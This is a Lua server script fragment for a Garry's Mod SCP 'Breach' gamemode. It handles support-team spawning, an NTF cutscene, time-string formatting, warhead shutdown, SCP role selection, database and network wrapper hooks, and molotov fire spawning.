		SPAWNEDPLAYERSASSUPPORT[#SPAWNEDPLAYERSASSUPPORT + 1] = ply
		pickedplayers[#pickedplayers + 1] = ply
		print(ply)
		if ply.LuckyOne then
			ply:CompleteAchievement("lucky")
		else
			ply.LuckyOne = true
		end
		pick = pick + 1
	end

	for _, ply in pairs(player.GetAll()) do
		if !table.HasValue(pickedplayers, ply) then
			ply.LuckyOne = false
		end 
	end

	local supinuse = {}
	local supspawns = table.Copy( SPAWN_FBI_SHTURM )
	local sups = {}

	local notp = cutscene != 0

	for i = 1, #pickedplayers do
		local ply = pickedplayers[i]

		local suproles = table.Copy( GetSupportRoleTable(pickedsupport) )
		local selected

		local shouldselectrole = true

		if shouldselectrole then
			repeat
				local role = table.remove( suproles, math.random( #suproles ) )
				supinuse[role.name] = supinuse[role.name] or 0

				if role.max == 0 or supinuse[role.name] < role.max then
					if role.level <= ply:GetNLevel() then
						if !role.customcheck or role.customcheck( ply ) then
							supinuse[role.name] = supinuse[role.name] + 1
							selected = role
							break
						end
					end
				end
			until #suproles == 0
		end

		local spawn = table.remove( supspawns, math.random( #supspawns ) )

		ply:SetupNormal()
		--timer.Simple(0.1, function()
			--ply:FadeMusic(17)
		--end)
		ply:ApplyRoleStats( selected )
		ply:SetPos( spawn )
		ply:Freeze(true)

		if IsValid(ply) then
			ply:NTF_Scene()
		end
	end

	BREACH.QueuedSupports = {}
	net.Start("SelectRole_Sync")
	net.WriteTable(BREACH.QueuedSupports)
	net.Broadcast()

	PlayAnnouncer("nextoren/round_sounds/intercom/support/onpzahod.ogg")
end



BREACH.PowerfulUIUSupportDelayed = false
function BREACH.PowerfulUIUSupport(caller,ent)
	if postround then
		--return
	end

	local pickedsupport = "FBI_SHTURM"

	local maxamount = 7
	PlayAnnouncer( "nextoren/round_sounds/intercom/support/fbi_enter.ogg" )
	local pickedplayers = {}
	if !SPAWNEDPLAYERSASSUPPORT then SPAWNEDPLAYERSASSUPPORT = {} end

	local pick = 0

	if forcesupportplys then
		for _, ply in pairs(forcesupportplys) do
			if pick >= maxamount then break end
			SPAWNEDPLAYERSASSUPPORT[#SPAWNEDPLAYERSASSUPPORT + 1] = ply
			pickedplayers[#pickedplayers + 1] = ply
			pick = pick + 1
		end
		forcesupportplys = nil
	end

	for _, ply in RandomPairs(GetActivePlayers()) do
		print(ply)
		if pick >= maxamount then break end
		if ply:GTeam() != TEAM_SPEC then continue end
		if ply.SpawnAsSupport == false then continue end
		if ply:GetPenaltyAmount() > 0 then continue end
		if LevelRequiredForSupport[pickedsupport] and ply:GetNLevel() < LevelRequiredForSupport[pickedsupport] then continue end
		SPAWNEDPLAYERSASSUPPORT[#SPAWNEDPLAYERSASSUPPORT + 1] = ply
		pickedplayers[#pickedplayers + 1] = ply
		print(ply)
		if ply.LuckyOne then
			ply:CompleteAchievement("lucky")
		else
			ply.LuckyOne = true
		end
		pick = pick + 1
	end

	for _, ply in pairs(player.GetAll()) do
		if !table.HasValue(pickedplayers, ply) then
			ply.LuckyOne = false
		end 
	end

	if ent then
		local monitors_exist = false
		for k, v in ipairs(ents.GetAll()) do
			if v:GetClass() == "onp_monitor" then
				monitors_exist = true
			end
		end

		if !monitors_exist then
			local spawntable = table.Copy(SPAWN_FBI_MONITORS)
		
			for i = 1, 5 do
				local selectedindx = math.random(1, #spawntable)
				local onp_monitor = ents.Create("onp_monitor")
				onp_monitor:SetPos(spawntable[selectedindx].pos)
				onp_monitor:SetAngles(spawntable[selectedindx].ang)
				onp_monitor:Spawn()
				onp_monitor:SetAngles(spawntable[selectedindx].ang)
				table.remove(spawntable, selectedindx)
			end
		end
	end

	local supinuse = {}
	local supspawns = table.Copy( SPAWN_FBI_SHTURM )
	local sups = {}

	local notp = cutscene != 0

	for i = 1, #pickedplayers do
		local ply = pickedplayers[i]

		local suproles = table.Copy( GetSupportRoleTable(pickedsupport) )
		local selected

		local shouldselectrole = true

		if shouldselectrole then
			repeat
				local role = table.remove( suproles, math.random( #suproles ) )
				supinuse[role.name] = supinuse[role.name] or 0

				if role.max == 0 or supinuse[role.name] < role.max then
					if role.level <= ply:GetNLevel() then
						if !role.customcheck or role.customcheck( ply ) then
							supinuse[role.name] = supinuse[role.name] + 1
							selected = role
							break
						end
					end
				end
			until #suproles == 0
		end

		local spawn = table.remove( supspawns, math.random( #supspawns ) )

		ply:SetupNormal()
		--timer.Simple(0.1, function()
			--ply:FadeMusic(17)
		--end)
		ply:ApplyRoleStats( selected )
		ply:SetPos( spawn )
		ply:Freeze(true)

		if IsValid(ply) then
			ply:NTF_Scene()
		end
	end

	BREACH.QueuedSupports = {}
	net.Start("SelectRole_Sync")
	net.WriteTable(BREACH.QueuedSupports)
	net.Broadcast()

	PlayAnnouncer("nextoren/round_sounds/intercom/support/onpzahod.ogg")
end

function PerformNTFCutscene()

	local NTFS = {}

	for _, ply in pairs(player.GetAll()) do
		if ply:GTeam() == TEAM_NTF then
			NTFS[#NTFS + 1] = ply
		end
	end

	local poses = {

		{pos = Vector(-10669.291016, -9, 1813.986816), ang = Angle(0,0.1,0), sequences = {"d1_t02_Plaza_Sit01_Idle", "d1_t02_Plaza_Sit02"}},
		{pos = Vector(-10669.291016, 30, 1813.986816), ang = Angle(0,0.1,0), sequences = {"d1_t02_Plaza_Sit01_Idle", "d1_t02_Plaza_Sit02"}},

		{pos = Vector(-10688.330078, -9, 1815.198730), ang = Angle(0,180,0), sequences = {"d1_t02_Plaza_Sit01_Idle", "d1_t02_Plaza_Sit02"}},
		{pos = Vector(-10688.330078, 30, 1815.198730), ang = Angle(0,180,0), sequences = {"d1_t02_Plaza_Sit01_Idle", "d1_t02_Plaza_Sit02"}},

		{pos = Vector(-10670.019531, -38.297939, 1813.780762), ang = Angle(0,70,0), sequences = {"d1_t01_trainride_stand"}},

	}

	local fake_skybox = ents.Create("fake_skybox")
	fake_skybox:SetPos(Vector(-12195.40625, 1010, 2649.53125))
	fake_skybox:Spawn()

	local vert = ents.Create("prop_dynamic")
	vert:SetModel("models/comradealex/mgs5/hp-48/hp-48test.mdl")
	vert:SetPos(Vector(-10679.3, -19.276970, 1765.031250))
	vert:Spawn()

	for _, ntf in ipairs(NTFS) do
		local sel = table.remove(poses, math.random(1,#poses))

		ntf:SetMoveType(MOVETYPE_NONE)
		ntf:SetNWEntity("NTF1Entity", ntf)
		ntf:SetNWAngle("ViewAngles", sel.ang)
		ntf:SetPos(sel.pos)
		ntf:SetCollisionGroup(COLLISION_GROUP_WORLD)

		ntf:SetForcedAnimation(table.Random(sel.sequences), math.huge)
		ntf:SetCycle(math.Rand(0,1))

		local uid = "freeze"..ntf:SteamID64()

		timer.Create(uid, 0, 0, function()
			if ntf:GTeam() != TEAM_NTF then
				timer.Remove(uid)
				return
			end
			if !IsValid(vert) then
				timer.Remove(uid)
				return
			end
			ntf:SetPos(sel.pos)
		end)

	end


	timer.Simple(30, function()
		for _, ply in ipairs(NTFS) do
			if IsValid(ply) and ply:GTeam() == TEAM_NTF then ply:ScreenFade(SCREENFADE.IN, Color(0,0,0), 1, 3) end
		end
		timer.Simple(2, function()
			if IsValid(vert) then vert:Remove() end
			if IsValid(fake_skybox) then fake_skybox:Remove() end
			for i, ply in ipairs(NTFS) do
				if IsValid(ply) and ply:GTeam() == TEAM_NTF then
					timer.Remove("freeze"..ply:SteamID64())
					ply:SetPos(SPAWN_OUTSIDE[i])
					ply:StopForcedAnimation()
					--ply:Freeze(false)
					ply:SetCollisionGroup(COLLISION_GROUP_PLAYER)
					ply:SetMoveType(MOVETYPE_WALK)
					ply:SetNWEntity("NTF1Entity", NULL)
					ply:SetNWAngle("ViewAngles", Angle(0,0,0))
					ply:GodDisable()
				end
			end
		end)
	end)


end

local function restoftabletostring(start, tab)

	local str = ""

	for i = start, #tab do
		str = str.." "..tab[i]
	end

	return string.sub(str, 2)

end

function string.Shaky_FormattedTime( seconds, format )
	if ( not seconds ) then seconds = 0 end
	local years = math.floor( seconds / 31536000 )
	if years > 0 then
		seconds = seconds - 31536000 * years
	end
	local months = math.floor( seconds / 2592000 )
	if months > 0 then
		seconds = seconds - 2592000 * months
	end
	local weeks = math.floor( seconds / 604800 )
	if weeks > 0 then
		seconds = seconds - 604800 * weeks
	end
	local days = math.floor( seconds / 86400 )
	if days > 0 then
		seconds = seconds - 86400 * days
	end
	local hours = math.floor( seconds / 3600 )
	if hours > 0 then
		seconds = seconds - 3600 * hours
	end
	local minutes = math.floor( seconds / 60 )
	if minutes > 0 then
		seconds = seconds - 60 * minutes
	end

	if ( format ) then
		return string.format( format, minutes, seconds )
	else
		return { y = years, w = weeks, m = months, d = days, h = hours, min = minutes, s = seconds }
	end
end

concommand.Add("restart_server", function(ply)
	if IsValid(ply) then return end
	SetGlobalInt("RoundUntilRestart", 0)
end)

local num_values = {
	["s"] = 1,
	["m"] = 60,
	["h"] = 3600,
	["d"] = 86400,
	["w"] = 604800,
	["mon"] = 2592000,
	["y"] = 31536000,
}

function StringToTime(str)

	if tonumber(str) then
		return tonumber(str)
	end

	local num = 1

	for name, value in pairs(num_values) do
		if str:EndsWith(name) then
			num = tonumber(string.sub(str, 0, #str-#name))
			num = num * value
			break
		end
	end

	return num

end

function string.NiceTime_Full_Eng( seconds )

	local list = string.Shaky_FormattedTime( seconds )

	local min = "l:nt_min"
	local day = "l:nt_d"
	local year = "l:nt_y"
	local month = "l:nt_m"
	local second = "l:nt_s"
	local hour = "l:nt_h"
	local week = "l:nt_w"

	local str = ""

	for t, v in pairs(list) do

		if v == 0 then continue end

		local strtime = tostring(v)

		if v > 1 then

			if t == "m" then

				month = "l:nt_ms"

			elseif t == "y" then

				year = "l:nt_ys"

			elseif t == "d" then

				day = "l:nt_ds"

			elseif t == "h" then

				hour = "l:nt_hs"

			elseif t == "min" then

				min = "l:nt_mins"

			elseif t == "w" then

				week = "l:nt_ws"

			elseif t == "s" then

				second = "l:nt_ss"

			end
		end

	end

	local tab = {}

	if list.y > 0 then
		tab[#tab + 1] = list.y.." "..year
	end

	if list.m > 0 then
		tab[#tab + 1] = list.m.." "..month
	end

	if list.w > 0 then
		tab[#tab + 1] = list.w.." "..week
	end

	if list.d > 0 then
		tab[#tab + 1] = list.d.." "..day
	end

	if list.h > 0 then
		tab[#tab + 1] = list.h.." "..hour
	end

	if list.min > 0 then
		tab[#tab + 1] = list.min.." "..min
	end

	if list.s > 0 then
		tab[#tab + 1] = list.s.." "..second
	end

	for i = 1, #tab do
		if i != 1 then
			if i == #tab then
				str = str.." and"
			else
				str = str.." ,"
			end
		end
		str = str.." "..tab[i]
	end

	print(str)

	return string.sub(str, 2)

end

string.NiceTime_Full_Rus = string.NiceTime_Full_Eng -- LAZY FUCK :DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD

function WarheadDisabled( siren )
	OMEGAEnabled = false
	OMEGADoors = false

	--if siren then
		--siren:Stop()
	--end
	net.Start( "SendSound" )
		net.WriteInt( 0, 2 )
		net.WriteString( "warhead/siren.ogg" )
	net.Broadcast()

	if timer.Exists( "omega_check" ) then timer.Remove( "omega_check" ) end
	if timer.Exists( "omega_alarm" ) then timer.Remove( "omega_alarm" ) end
	if timer.Exists( "omega_detonation" ) then timer.Remove( "omega_detonation" ) end
	
	for k, v in pairs( ents.FindByClass( "func_door" ) ) do
		if IsInTolerance( OMEGA_GATE_A_DOORS[1], v:GetPos(), 100 ) or IsInTolerance( OMEGA_GATE_A_DOORS[2], v:GetPos(), 100 ) then
			v:Fire( "Unlock" )
			v:Fire( "Close" )
		end
	end
end

function GM:BreachSCPDamage( ply, ent, dmg )
	if IsValid( ply ) and IsValid( ent ) then
		if ent:GetClass() == "func_breakable" then
			ent:TakeDamage( dmg, ply, ply )
			return true
		end
	end
end

-- POV YOU DONT KNOW ABOUT table.HasValue

function isInTable( element, tab )
	for k, v in pairs( tab ) do
		if v == element then return true end
	end
	return false
end

function DARK()
    engine.LightStyle( 0, "a" )
    BroadcastLua('render.RedownloadAllLightmaps(true)')
    BroadcastLua('RunConsoleCommand("mat_specular", 0)')
end

net.Receive("SelectSCPClientside", function(len, ply)

	if ply:GTeam() != TEAM_SCP then return end
	if !ply:IsPremium() then return end
	if ply.SelectedSCPAlready then return end

	local scp = net.ReadString()

	local isselected = false

	for i, v in ipairs(player.GetAll()) do
		if v:GetRoleName() == scp then
			isselected = true
			break
		end
	end

	if !isselected then

		ply.SelectedSCPAlready = true
		local pos = ply:GetPos()

		ply:SetupNormal()
		local SCP_Object = GetSCP(scp)
		SCP_Object:SetupPlayer(ply)
		--ply:SetPos(pos)

	else
		
		ply:RXSENDNotify("l:scp_occupied_pt1 \""..GetLangRole(scp).."\" l:scp_occupied_pt2")

		local tab = table.Copy(SCPS)

		local plys = player.GetAll()
		for i = 1, #plys do
			local ply1 = plys[i]
			if table.HasValue(tab, ply1:GetRoleName()) then
				table.RemoveByValue(tab, ply1:GetRoleName())
			end
		end

		net.Start("SCPSelect_Menu")
		net.WriteTable(tab)
		net.Send(ply)

	end


end)

_query = _query || sql.Query
_setpdata = _setpdata || mply.SetPData

function mply:SetPData(dataname, value)

	if BREACH.DataBaseSystem and BREACH.DataBaseSystem.PDATASWAP and BREACH.DataBaseSystem.PDATASWAP[dataname] then

		self:SetBreachData(dataname,value)

	else

		_setpdata(self, dataname, value)
	
	end

end

local lastquery = ""

LOGS_DATABASE_USAGE = LOGS_DATABASE_USAGE || {}

function sql.Query(q)
	if q:find("srv1_gas") then return end
	--if lastquery != q then
		--lastquery = q
		if DEBUG_SHOWQUERY then
			print('wacka wacka', q)
		end
		table.insert(LOGS_DATABASE_USAGE, {q, debug.traceback(), CurTime()})
	--end
	return _query(q)
end

_netstart = _netstart || net.Start

function net.Start(messageName, unreliable)
	--if !tonumber(messageName) and messageName != "Effect" then
		--print(messageName)
	--end
	return _netstart(messageName, unreliable)
end

local delete_test = {
	"breachachievements",
	"awarn_offlinedata",
	"awarn_playerdata",
	"awarn_warnings",
	"gas_offline_player_data",
	"gas_steam_avatars",
	"gas_teams",
	"ksaikok_ips",
	"rememberconnections",

}

local function CreateMolotovBox(pos, delay, dontcheck, checkfrom, ignore_nade)

	local red = false

	local filter = function(ent)

		if IsValid(ent) and ( ent:IsPlayer() or ent:GetClass() == "breach_molotov_fire" or ent == ignore_nade ) then return false end

		return true

	end

	if !dontcheck then

		local offest = Vector(0,0, 10)

		local height_check = 50

		local tr2 = util.TraceLine( {
			start = pos+Vector(0,0,height_check),
			endpos = pos+Vector(0,0,-height_check),
			filter = filter,
		} )

		if !tr2.Hit then

			return true

		else

			pos = tr2.HitPos

		end


		local tr = util.TraceLine( {
			start = checkfrom+offest,
			endpos = pos+offest,
			filter = filter,
		} )

		if tr.Hit then

			return true

		end

	end

	local fire_box = ents.Create("breach_molotov_fire")
	fire_box:SetPos(pos)
	fire_box:Spawn()


	SafeRemoveEntityDelayed(fire_box, delay)



end


function BREACH_FIRE_INITIATE(pos, delay, ignore)

	if !delay then delay = 1 end

	local boxes_forward = 4
	local boxes_distant = 30
	local boxes_distant = 30

	CreateMolotovBox(pos, delay, true, ignore)

	local circles = 16

	local ang = 0

	local ignorefirst = true

	for i = 1, circles do
		ignorefirst = !ignorefirst
		ang = ang + 360/circles

		local go = Angle(0, ang, 0):Forward()

		for curbox = 1, boxes_forward do
			if curbox <= 2 and ignorefirst then continue end
			local interrupted = CreateMolotovBox(pos + go*boxes_distant*curbox, delay, false, pos--[[ - (go*boxes_distant*math.Clamp(curbox-1, 0, 1))/2]], ignore)
			if interrupted then break end
		end

	end


end
